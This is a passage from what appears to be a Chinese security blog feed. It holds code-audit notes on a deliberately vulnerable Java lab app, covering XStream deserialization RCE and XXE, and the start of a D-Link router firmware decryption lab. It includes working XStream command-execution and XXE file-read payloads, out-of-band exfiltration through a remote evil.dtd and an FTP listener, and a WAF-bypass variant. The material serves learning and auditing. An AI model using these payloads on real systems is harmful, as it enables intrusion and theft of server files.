title="19.XStreamRCE"></a>19.XStreamRCE</h2><blockquote><p>XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</p><p>Xstream具有以下优点</p><ul><li>使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。</li><li>无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。</li><li>性能 - XStream快速和低内存占用，适合于大对象图或系统。</li><li>干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。</li><li>不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。</li><li>完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。</li><li>可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。</li><li>安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。</li><li>错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。</li><li>另一种输出格式 - XStream支持其它的输出格式，如JSON。</li></ul></blockquote><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @PostMapping(&quot;&#x2F;xstream&quot;)</span><br><span class="line">    public String parseXml(HttpServletRequest request) throws Exception &#123;</span><br><span class="line">        String xml &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">        return &quot;xstream&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user &#x3D; new User();</span><br><span class="line">        user.setId(0);</span><br><span class="line">        user.setUsername(&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        String xml &#x3D; xstream.toXML(user); &#x2F;&#x2F; Serialize</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        user &#x3D; (User) xstream.fromXML(xml); &#x2F;&#x2F; Deserialize</span><br><span class="line">        System.out.println(user.getId() + &quot;: &quot; + user.getUsername());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造请求包如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xstream HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;7BBEAB4E7FC8E7B10575631B0CA5413C; XSRF-TOKEN&#x3D;820fd620-2c78-424b-a852-93ca40553975; remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 445</span><br><span class="line"></span><br><span class="line">&lt;sorted-set&gt;  </span><br><span class="line">  &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt; &lt;!-- --&gt;</span><br><span class="line">    &lt;interface&gt;java.lang.Comparable&lt;&#x2F;interface&gt;</span><br><span class="line">    &lt;handler class&#x3D;&quot;java.beans.EventHandler&quot;&gt;</span><br><span class="line">      &lt;target class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;command&gt;</span><br><span class="line">          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">          &lt;string&gt;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">        &lt;&#x2F;command&gt;</span><br><span class="line">      &lt;&#x2F;target&gt;</span><br><span class="line">      &lt;action&gt;start&lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;handler&gt;</span><br><span class="line">  &lt;&#x2F;dynamic-proxy&gt;</span><br><span class="line">&lt;&#x2F;sorted-set&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027154504421.png" alt="image-20211027154504421"></p><ol><li><a href="https://www.cnblogs.com/303donatello/p/13998245.html">CVE-2020-26217 | XStream远程代码执行漏洞</a></li><li><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">通过XStream对象反序列化的RCE</a></li><li><a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li></ol><h2 id="20-XXE"><a href="#20-XXE" class="headerlink" title="20.XXE"></a>20.XXE</h2><p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;DocumentBuilder&#x2F;vuln01&quot;, method &#x3D; RequestMethod.POST)</span><br><span class="line">public String DocumentBuilderVuln01(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line">        StringReader sr &#x3D; new StringReader(body);</span><br><span class="line">        InputSource is &#x3D; new InputSource(sr);</span><br><span class="line">        Document document &#x3D; db.parse(is);  &#x2F;&#x2F; parse xml</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 遍历xml节点name和value</span><br><span class="line">        StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        NodeList rootNodeList &#x3D; document.getChildNodes();</span><br><span class="line">        for (int i &#x3D; 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode &#x3D; rootNodeList.item(i);</span><br><span class="line">            NodeList child &#x3D; rootNode.getChildNodes();</span><br><span class="line">            for (int j &#x3D; 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                Node node &#x3D; child.item(j);</span><br><span class="line">                buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sr.close();</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有回显的利用方式</p><p>输入对应的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;book id&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;name&gt;Good Job&lt;&#x2F;name&gt;</span><br><span class="line">&lt;author&gt;ol4three&lt;&#x2F;author&gt;</span><br><span class="line">&lt;year&gt;2021&lt;&#x2F;year&gt;</span><br><span class="line">&lt;price&gt;100.00&lt;&#x2F;price&gt;</span><br><span class="line">&lt;&#x2F;book&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163512520.png" alt="image-20211027163512520"></p><p>利用file协议读取文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 131</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE joychou [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;111.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163556622.png" alt="image-20211027163556622"></p><p>在 XML 元素中，”&lt;” 和 “&amp;” 是非法的。”&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。”&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164028767.png" alt="image-20211027164028767"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ cat 111.txt</span><br><span class="line">ol4three</span><br><span class="line">1111</span><br><span class="line">~!@#%^%&#39;&quot;&gt;</span><br><span class="line">2222</span><br><span class="line">&lt;%&amp;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164104470.png" alt="image-20211027164104470"></p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><blockquote><p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p><p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p></blockquote><p>简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。</p><h3 id="1-有回显"><a href="#1-有回显" class="headerlink" title="1.有回显"></a>1.有回显</h3><p>本地主机：CDATA Payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;test.ol4three.com:800&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p>本地主机：evil.dtd</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>但我在测试用CDATA，并没有读取<code>&lt;&amp;</code>成功</p><h3 id="2-Bind-无回显"><a href="#2-Bind-无回显" class="headerlink" title="2.Bind 无回显"></a>2.Bind 无回显</h3><p>payloads：</p><ul><li>没有ENTITY关键字，可以用来Bypass WAF</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>有ENTITY关键字，可能会被WAF拦截</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;redhat-release&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;ftp:&#x2F;&#x2F;fakeuser:fakepass@test.joychou.org:2121&#x2F;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><p>或者将<code>%payload;</code>放在ftp的username或者password处。如果ftp不跟用户名或者密码<code>ftp://test.joychou.org:2121/%payload;</code>，利用FTP协议会接收到Java的版本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New client connected</span><br><span class="line">&lt; USER anonymous</span><br><span class="line">&lt; PASS Java1.8.0_121@</span><br><span class="line">&lt; TYPE I</span><br><span class="line">&lt; EPSV ALL</span><br><span class="line">&lt; EPSV</span><br><span class="line">&lt; EPRT |1|172.17.29.150|60731|</span><br><span class="line">&lt; RETR test</span><br><span class="line">&lt; xxe</span><br><span class="line">&lt; ftp</span><br></pre></td></tr></table></figure><p>FTP Server代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;socket&#39;</span><br><span class="line">server &#x3D; TCPServer.new 2121</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data &#x3D; &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req &#x3D; client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>测试的结果(Centos)：</p><table><thead><tr><th>Java版本</th><th>是否能读换行</th><th>被截断的字符</th><th>其他报错的字符(什么都不能读)</th><th>被替换成换行的字符</th></tr></thead><tbody><tr><td>1.7.0_80</td><td>是</td><td># ?</td><td>% &amp; ‘</td><td>/</td></tr><tr><td>1.8.0_121</td><td>是</td><td># ?</td><td>% &amp; ‘</td><td>/</td></tr><tr><td>1.8.0_181</td><td>否</td><td># ?</td><td>% &amp; ‘</td><td>/</td></tr></tbody></table><p>可能还有其他的字符和其他的Java版本没有测试。不过我猜测，自从Java 1.8的某个版本起，就不能读取换行。至于是那个版本开始，就不具体测试了，大家知道这个特性就好 -)</p><p>也可以把FTP换成HTTP协议，更加直观</p><h3 id="3-支持的Xinclude的XXE"><a href="#3-支持的Xinclude的XXE" class="headerlink" title="3.支持的Xinclude的XXE"></a>3.支持的Xinclude的XXE</h3><p>POC</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>详情可以查看<a href="https://www.anquanke.com/post/id/156227">浅析xml之xinclude &amp; xslt</a></p><h3 id="各平台支持协议如下："><a href="#各平台支持协议如下：" class="headerlink" title="各平台支持协议如下："></a>各平台支持协议如下：</h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027165310121.png" alt="image-20211027165310121"></p><ol><li><a href="https://blog.spoock.com/2018/10/23/java-xxe/">JAVA常见的XXE漏洞写法和防御</a></li><li><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/">Java-XXE-总结</a></li><li><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java_XXE_漏洞</a></li></ol><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/">https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/</a></p><p><a href="https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5">https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程&lt;/p&gt;
&lt;h1 id=&quot;0x01环境配置&quot;&gt;&lt;a href=&quot;#0x01环境配置&quot; class=&quot;headerlink&quot; title=&quot;0x01环境配置&quot;&gt;&lt;/a&gt;0x01环境配置&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Mac os 11.2.2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tomcat 8.5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;idea&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;msyql 8.0.70&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;导入idea项目配置本地tomcat&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;JoyChou93&amp;#x2F;java-sec-code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd java-sec-code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mvn clean package&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Code_audit" scheme="http://www.ol4three.com/tags/Code-audit/"/>
    
      <category term="WEB安全" scheme="http://www.ol4three.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>D-Link DIR-882固件解密实验</title>
    <link href="http://www.ol4three.com/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/"/>
    <id>http://www.ol4three.com/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/</id>
    <published>2021-03-10T06:54:09.000Z</published>
    <updated>2022-07-22T10:00:30.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-实验目的"><a href="#0x01-实验目的" class="headerlink" title="0x01 实验目的"></a>0x01 实验目的</h1><blockquote><p>通过本次实验学习，如何在固件被加密的情况下进行解密，使得固件层面的 路由器安全研究顺利进行</p></blockquote><h1 id="0x02-概述"><a href="#0x02-概述" class="headerlink" title="0x02 概述"></a>0x02 概述</h1><p>固件升级的一种方案 随着物联网安全安全越来越重视，作为万物互联的核心之一—路由器的安全也越 来越重视，反映在固件方面，就是其针对附件做的一些安全措施，可以使得一些 安全研究员手足无措，不过由于一些历史原因，很可能我们可以通过分析固件的 之前的一些版本，找到研究固件当前版本的一些线索。 下面这张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310145532897.png" alt="image-20210310145532897"></p><p>是很多路由器厂家会采取的一种更新升级固件并使固件更加“安全“的方案。 这个方案是这样的：最开始发布的固件是没有加密的，也没有附带任何解密的文 件，随着固件更新，解密文件会和较新版本 v1.1 中的未加密版本一起发布，以 便将来进行固件加密，v1.1 版本作为过渡使用。而到了 v1.2 时，固件则是以加 密形式发布的，不过仍附带解密文件。</p><a id="more"></a><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><p>服务器：attify os</p><p>辅助工具：firmwalk.sh(以及3个固件都在附件里)</p><p><a href="https://github.com/OL4THREE/Practice-Note/tree/main/D-Link%20DIR-882固件解密实验">固件下载地址</a></p><h1 id="0x04-实验操作"><a href="#0x04-实验操作" class="headerlink" title="0x04 实验操作"></a>0x04 实验操作</h1><p>在本次实验中，我们首先将研究路由器固件升级常见的一种方案，并找到该方案 的漏洞所在，通过实际分析相关的几个固件，最后对新版加密固件的文件系统的 提取。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：iot 密码：attify</span><br><span class="line">数据库：postgre 密码：firmadyne</span><br></pre></td></tr></table></figure><p>这次的实验，我们以 D-Link DIR-882 固件为例。我们在分析固件时会发现它被 加密过了，使用 binwalk 根本无法探测，比如这次的固件 <code>v1.20b06</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151511835.png" alt="image-20210310151511835"></p><p>这时候我们可以考虑通过分析旧版本的固件尝试是否有什么线索来解密现在这 个新版本的固件 在 这 里 我 们 可 以 找 到 所 有 旧 版 本 的 固 件 （ <a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</a> ） ， 我 们 找 个 最 早 的 版 本 v1.00b07，下载来后解压尝试binwalk读取</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151552125.png" alt="image-20210310151552125"></p><p>可以看到能识别出信息，或者说是没有加密过的。 那再看看稍微新一点的版本</p><p><code>v1.10b02</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151718892.png" alt="image-20210310151718892"></p><p>可以看到有两个 bin 文件，说明 1.04b02 的过渡版本，它包含在 v1.10b02 固件包 汇中，名字也已经告诉我们了，1.04b02 是未加密的 分别使用 binwalk</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152045023.png" alt="image-20210310152045023"></p><p>而加密后的固件却什么也看不到</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152141476.png" alt="image-20210310152141476"></p><p>我们把 1.04b02 提取出来</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152258117.png" alt="image-20210310152258117"></p><p>进入生成的文件夹</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152409226.png" alt="image-20210310152409226"></p><p>注意到有两个文件，使用 binwalk 提取 A0 进入新文件夹 再次提取8AB758最近进入文件夹</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152655387.png" alt="image-20210310152655387"></p><p>注意到这里有一个 Imgdecrypt 的文件，看名字，应该是用来解密镜像的 file 查看</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153928160.png" alt="image-20210310153011754"></p><p>发现是个可执行文件，尝试执行，缺少相应的 so 文件，这很正常，因为这个文 件是写在 mips 架构上运行的，而我们目前是 x86 为了运行它，我们使用 qemy-mipsel-static</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153011754.png" alt="image-20210310153011754"></p><p>首先将其复制到固件根文件系统的/usr/bin 目录下 在将前面发现是加密的固件 1.20b06 复制过来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chroot . .&#x2F;qemu-mipsel-static .&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153928160.png" alt="image-20210310153928160"></p><p>接着还是同样的办法模拟 mips 架构拿到 shell 此时再执行 imgdecrypt 可以看到 打印出了使用方法 按照其提示，可以看到对原来加密的固件进行了解密 操作如上图所示 这时候再次使用 binwalk 查看被解密后的固件，可以看到已经可以识别了</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310154124223.png" alt="image-20210310154124223"></p><p>这给我们的启示就是，在碰到加密的固件时，可以考率查找位于同一产品线、具 有相同处理器体系结构的路由器固件，找那些版本旧一些的，或者过渡版本，或 许就能为我们提供线索。 我们使用 binwalk 如之前未加密的固件一般一步步提取</p><p><img 